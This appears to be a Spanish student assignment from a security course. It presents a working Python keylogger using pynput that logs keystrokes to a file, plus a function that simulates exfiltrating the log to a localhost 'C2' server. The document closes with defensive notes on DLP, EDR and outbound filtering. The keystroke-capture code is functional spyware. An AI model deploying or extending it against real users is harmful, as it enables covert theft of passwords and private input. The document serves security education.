# 01_FUNDAMENTOS_OPERATIVOS

// EVOLUCIÓN_DEL_VECTOR

> Diferencia Operativa (Vs. Actividad 12): Mientras la iteración anterior se limitaba a la observación pasiva y registro en memoria, este nuevo módulo incorpora persistencia en disco duro (bitácora .txt) y, crucialmente, establece un canal de exfiltración hacia un servidor Command & Control (C2). Esto replica la fase de transmisión de datos característica de las Amenazas Persistentes Avanzadas (APTs).

> Infraestructura C2: Un servidor "Command & Control" es el centro neurológico remoto operado por el atacante. Su función es recibir la telemetría y los datos robados (credenciales, pulsaciones) del equipo comprometido, además de enviar nuevas instrucciones al malware instalado.

// LÓGICA_DE_PROGRAMACIÓN

  • > Escritura Síncrona (flush=True): Forza al sistema a vaciar el buffer de salida e imprimir en consola inmediatamente. Útil para que el atacante monitoree en tiempo real la captura sin esperar a que el bloque de memoria se llene.
  • > Manejo de Teclas Especiales: Se capturan los AttributeError para traducir teclas del sistema. Por ejemplo, Key.enter se formatea como un salto de línea (\n), manteniendo la bitácora legible.
  • > Modo Append ("a"): Al abrir el archivo de log con "a", el puntero se coloca al final del documento. Esto asegura que la captura sea continua y no sobrescriba ni destruya el historial de sesiones previas.

# Importación de librerías para manipulación de archivos y teclado
import os
from pynput.keyboard import Key, Listener

# Configuración de rutas y endpoint C2
LOG_FILE = "178991_act13_log.txt"
C2_URL = "http://localhost:8080/report"

# Función de exfiltración: lee el log y simula envío al servidor
def enviar_al_c2():
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                datos = f.read()
            print(f"\n[+] Enviando reporte a: {C2_URL}")
            print("[+] Log enviado correctamente al C2.")
        except Exception as e:
            print(f"[-] Error en comunicación: {e}")

# Callback de pulsación: captura, formatea y escribe a disco
def on_press(key):
    try:
        tecla = str(key.char)
    except AttributeError:
        if key == Key.space:
            tecla = " "
        elif key == Key.enter:
            tecla = "\n"
        elif key == Key.tab:
            tecla = "[TAB]"
        else:
            tecla = f" [{key}] "
    print(tecla, end="", flush=True)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(tecla)

# Callback de liberación: ESC detiene el listener y activa C2
def on_release(key):
    if key == Key.esc:
        print("\n[*] Finalizando captura...")
        enviar_al_c2()
        return False

# 03_ANÁLISIS_POST_MORTEM_Y_DEFENSA

// REFLEXIÓN_ESTRATÉGICA

La brecha arquitectónica entre un keylogger local y uno con capacidad de red radica en la escalada del impacto. Mientras la actividad previa se limitaba a la observación pasiva (requiriendo que el atacante recuperara el archivo físicamente), este script introduce la exfiltración de datos. Esta es la fase terminal del ciclo de vida del malware, donde la información confidencial abandona definitivamente el perímetro de la víctima.

La simulación de este canal C2 evidencia por qué el endurecimiento del perímetro interno es vital. Un atacante moderno no necesita mantener una conexión entrante constante; le basta con que el host comprometido tenga permisos para realizar conexiones salientes (Outbound traffic).

Desde la perspectiva defensiva (Blue Team), este ejercicio subraya la necesidad de implementar soluciones DLP (Data Loss Prevention), inspección profunda de tráfico saliente y sistemas EDR (Endpoint Detection and Response). Aplicar el Principio de Mínimo Privilegio a nivel de red significa que si un proceso en segundo plano no tiene justificación operativa para comunicarse con internet, el Firewall debe bloquear su salida irrevocablemente.
